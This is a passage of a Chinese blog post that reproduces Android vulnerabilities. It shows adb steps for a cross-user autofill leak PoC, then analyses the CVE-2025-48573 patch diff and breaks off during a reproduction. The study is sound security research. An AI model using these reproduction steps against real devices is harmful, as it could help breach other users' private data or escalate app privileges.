<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> list</span><span style="color:#B56959;--shiki-dark:#C98A7D"> users</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可获取所有现有用户的列表。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> create-user</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可创建新用户并返回</span><span style="color:#B56959;--shiki-dark:#C98A7D"> ID。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> remove-user</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可按</span><span style="color:#B56959;--shiki-dark:#C98A7D"> ID</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 移除特定用户。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> disable</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可为特定用户停用软件包。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> enable</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可为特定用户启用软件包。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> list</span><span style="color:#B56959;--shiki-dark:#C98A7D"> packages</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可为特定用户列出软件包（-e</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可列出已启用的软件包，-d</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可列出已停用的软件包）。默认情况下，此命令始终为系统用户列出软件包。</span></span></code></pre>
<p>设备上的用户：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767150680185-901a5f0b-dead-400f-9ed7-ae610537a263.png" alt="img"></p>
<p>当前用户ID：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767150866499-8ffff115-0864-42c2-af9e-96d206b25663.png" alt="img"></p>
<p>切换到用户10，然后手机上就切换到testuser了：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767151057720-a6ae2983-07de-4c1f-a276-b738f76ec17d.png" alt="img"></p>
<p>在user0下拍个照，并复制到/storage/emulated/0/Android/data/com.example.autofillpoc/files/</p>
<p>文件夹下【需要是user0的私有目录】，已有的照片在/sdcard/DCIM/User0Only文件夹下：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> switch-user</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">mkdir</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /sdcard/DCIM/User0Only</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">#查看图片名称</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">cd</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /sdcard/DCIM/Camera</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">ls</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">cp</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /sdcard/DCIM/Camera/PXL_20251231_030147482.jpg</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /sdcard/DCIM/User0Only/</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">#【这个目录 从 Android 11 开始就被强隔离了】放user0的私有目录下</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">mkdir</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -p</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /storage/emulated/0/Android/data/com.example.autofillpoc/files/</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">cp</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /sdcard/DCIM/User0Only/PXL_20251231_030147482.jpg</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /storage/emulated/0/Android/data/com.example.autofillpoc/files/secret.jpg</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">chmod</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 600</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /storage/emulated/0/Android/data/com.example.autofillpoc/files/secret.jpg</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767169749049-7245c9d6-1e60-486a-a6a7-37799eef0f7a.png" alt="img"></p>
<p>可以看到有照片</p>
<p>Step 2：安装 PoC（在 User 0 而不是 user10）</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> switch-user</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> install</span><span style="color:#B56959;--shiki-dark:#C98A7D"> app-debug.apk</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">#adb install AutofillUserLeakPoC.apk</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767151952497-0451645e-5414-43e1-bcc2-fefaecaf79bf.png" alt="img"></p>
<p>PoC Autofill Service 安装在 user 0,确认一下：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> list</span><span style="color:#B56959;--shiki-dark:#C98A7D"> packages</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#AB5959;--shiki-dark:#CB7676"> |</span><span style="color:#59873A;--shiki-dark:#80A665"> findstr</span><span style="color:#B56959;--shiki-dark:#C98A7D"> autofillpoc</span></span></code></pre>
<p>而 <strong>user 10 中不安装这个 PoC</strong>（这是漏洞利用关键）</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767167098801-f79fa370-a802-4c69-8c29-7ae066c48cc1.png" alt="img"></p>
<p>启用 Autofill Service【user0启用】</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> settings</span><span style="color:#B56959;--shiki-dark:#C98A7D"> put</span><span style="color:#B56959;--shiki-dark:#C98A7D"> secure</span><span style="color:#B56959;--shiki-dark:#C98A7D"> autofill_service</span><span style="color:#B56959;--shiki-dark:#C98A7D"> com.example.autofillpoc/.LeakAutofillService</span></span></code></pre>
<p>用 adb 验证 Service 是否被系统识别</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> dumpsys</span><span style="color:#B56959;--shiki-dark:#C98A7D"> package</span><span style="color:#B56959;--shiki-dark:#C98A7D"> com.example.autofillpoc</span><span style="color:#AB5959;--shiki-dark:#CB7676"> |</span><span style="color:#59873A;--shiki-dark:#80A665"> findstr</span><span style="color:#B56959;--shiki-dark:#C98A7D"> LeakAutofillService</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767166514319-4593b9ee-cf76-4912-b71e-5f5472b25440.png" alt="img"></p>
<p>验证 Autofill Service 是否真的生效【在user10 下】</p>
<p>执行成功后，立刻检查：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> settings</span><span style="color:#B56959;--shiki-dark:#C98A7D"> get</span><span style="color:#B56959;--shiki-dark:#C98A7D"> secure</span><span style="color:#B56959;--shiki-dark:#C98A7D"> autofill_service</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767166707047-a35d6108-72b0-418d-92a0-87fd6ad8c51f.png" alt="img"></p>
<p>如果是 <code>null</code> 或 <code>default</code> → 说明设置没生效</p>
<p>漏洞验证：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> settings</span><span style="color:#B56959;--shiki-dark:#C98A7D"> put</span><span style="color:#B56959;--shiki-dark:#C98A7D"> secure</span><span style="color:#B56959;--shiki-dark:#C98A7D"> autofill_service</span><span style="color:#B56959;--shiki-dark:#C98A7D"> com.example.autofillpoc/.LeakAutofillService</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> settings</span><span style="color:#B56959;--shiki-dark:#C98A7D"> get</span><span style="color:#B56959;--shiki-dark:#C98A7D"> secure</span><span style="color:#B56959;--shiki-dark:#C98A7D"> autofill_service</span></span></code></pre>
<p>触发 Autofill</p>
<ul>
<li>打开任意含 <code>EditText</code> 的 App（如浏览器搜索框）</li>
<li>点击输入框</li>
<li>等待 Autofill UI 弹出</li>
</ul>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767171510553-4fc2b10e-ec79-42e3-876b-53daee804800.png">https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767171510553-4fc2b10e-ec79-42e3-876b-53daee804800.png</a>" alt="img" style="zoom: 33%;" /&gt;</p>
<p>原因排查</p>
<p>在 PC 上执行（Windows 没问题）：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> logcat</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -c</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> logcat</span></span></code></pre>
<p>然后在手机上：</p>
<ol>
<li>点击 Chrome 的 EditText</li>
<li>等它再次提示“屡次停止运行”</li>
</ol>
<p>在 logcat 里会看到类似：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">FATAL EXCEPTION: main</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Process: com.example.autofillpoc</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767172287097-cc4ad5b8-d7e2-498e-87f0-cc6d49575964.png" alt="img"></p>
<p>标红色框的下一条：</p>
<p>这是因为 <strong>Android N 非常核心的一条安全规则</strong>：<strong>RemoteViews 不允许使用</strong> <code>**file://**</code> <strong>URI</strong></p>
<p>因为 RemoteViews 会被“跨进程 / 跨用户”渲染</p>
<p>所以系统直接在：</p>
<p>rv.setImageViewUri(...)</p>
<p>这里 <strong>强制 kill  AutofillService</strong></p>
<p>蓝色框中的内容表明：</p>
<ul>
<li><strong>AutofillService 运行在 user10</strong></li>
<li>RemoteViews 尝试访问 <strong>user0 的 MediaProvider</strong></li>
<li>MediaProvider 明确识别到：<strong>这是跨用户访问</strong></li>
</ul>
<p>因为poc使用的代码是：  <strong>file://</strong></p>
<p><strong>【   】</strong></p>
<h1 id="二-cve-2025-48573"><a class="anchor" href="#二-cve-2025-48573">#</a> 二、CVE-2025-48573</h1>
<h2 id="一-漏洞原因-2"><a class="anchor" href="#一-漏洞原因-2">#</a> (一) 漏洞原因</h2>
<h3 id="1-nvd描述-2"><a class="anchor" href="#1-nvd描述-2">#</a> 1. NVD描述</h3>
<p>在 MediaSessionRecord.java 的 sendCommand 方法中，由于 FGS（Foreground Service） 在使用中滥用，可能存在在应用程序处于后台运行时启动前台服务的情况。这可能导致本地权限提升，而无需额外的执行权限。利用此漏洞无需用户交互。【使得后台 App 可以启动 FGS前台服务】</p>
<p><code>sendCommand</code> 允许外部（如 <code>MediaController</code>）向持有 Session 的应用程序发送<strong>自定义指令</strong>（即标准播放控制之外的命令，如“点赞”、“切换画质”、“修改播放模式”等）。</p>
<p><strong>作用：</strong> 接收来自 <code>MediaController</code> 的通用指令，进行权限检查和参数校验，然后通过 Binder 机制将指令转发给应用程序进程中的 <code>MediaSession.Callback</code>。</p>
<h3 id="2-commit信息-2"><a class="anchor" href="#2-commit信息-2">#</a> 2. commit信息</h3>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Do not propagate WIU/BFSL for MediaController.sendCommand</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">This call is just for exchanging technical information and</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">shouldn't be used to grant another app permission to start a</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">foreground service or gain while-in-use permissions.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">//不要将 WIU/BFSL 信息传递给 MediaController.sendCommand。此调用仅用于交换技术信息，</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">//不应用于授予其他应用程序启动前台服务或获取使用中权限的权限。</span></span></code></pre>
<h3 id="3-diff信息-2"><a class="anchor" href="#3-diff信息-2">#</a> 3. diff信息</h3>
<p>改变的文件在下<code>a/services/core/java/com/android/server/media/MediaSessionRecord.java</code>：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260117205828172.png" alt="image-20260117205828172"></p>
<p>主要的变化是<strong>删除了</strong>两行关于“临时白名单（Temporary Allowlist）”的代码。</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">1461</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">9</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">1461</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">         public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> sendCommand</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">String packageName</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> pid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> uid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String command</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Bundle args</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ResultReceiver cb</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        含义：定义了一个名为 sendCommand 的公共方法。</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    参数解释：packageName：接收命令的目标应用包名。</span><span style="color:#59873A;--shiki-dark:#80A665">pid</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Process ID</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">：目标进程 ID。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">		uid</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">User ID</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">：目标用户 ID。 command：具体的命令字符串（例如 </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">play</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">pause</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> 等）</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">		args：命令携带的额外参数（Bundle 类型）。</span><span style="color:#59873A;--shiki-dark:#80A665">cb</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ResultReceiver</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">：回调接口，用于接收命令执行的结果。</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">         </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">             try</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#AB5959;--shiki-dark:#CB7676">                final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> reason</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> TAG </span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">:</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> command</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//用于系统日志记录，格式是 "TAG:命令名"。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">					//tempAllowlistTargetPkgIfPossible() 是ActivityManagerService 的核心					方法之一：是给目标应用发放一张“临时通行证”，允许目标应用在接收到这个命令后，有权限从后台启动服务或 Activity。</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B07D48;--shiki-dark:#BD976A">                mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">tempAllowlistTargetPkgIfPossible</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#59873A;--shiki-dark:#80A665">getUid</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#59873A;--shiki-dark:#80A665"> getPackageName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                        pid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> uid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> packageName</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> reason</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//申请临时白名单</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                 mCb</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCommand</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">packageName</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> pid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> uid</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> command</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> args</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> cb</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//这是真正执行“发送命令”的地方，mCb 通常是一个 Binder 代理对象，它会将这些参数跨进程传输给目标应用。</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                 </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                 </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">             </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> catch</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">RemoteException </span><span style="color:#B07D48;--shiki-dark:#BD976A">e</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                 Slog</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">e</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Remote failure in sendCommand.</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> e</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//这是 Android 系统内部使用的 Log 工具（System Log），记录错误日志。</span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<h2 id="二漏洞复现"><a class="anchor" href="#二漏洞复现">#</a> (二)漏洞复现</h2>
<h3 id="1环境"><a class="anchor" href="#1环境">#</a> 1.环境</h3>
<p>系统：Android15</p>
<p>安全更新：2025年5月5日</p>
<p>开启调试：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> root</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> remount</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> logcat</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -c</span></span></code></pre>
<p>流程：</p>
<p>┌───────────┐        MediaController.sendCommand()<br>
│  App A    │ ────────────────────────────────▶ system_server<br>
│ Attacker  │                                           													 │<br>
│ (后台)    │                                        	  													  │ tempAllowlistTargetPkgIfPossible<br>
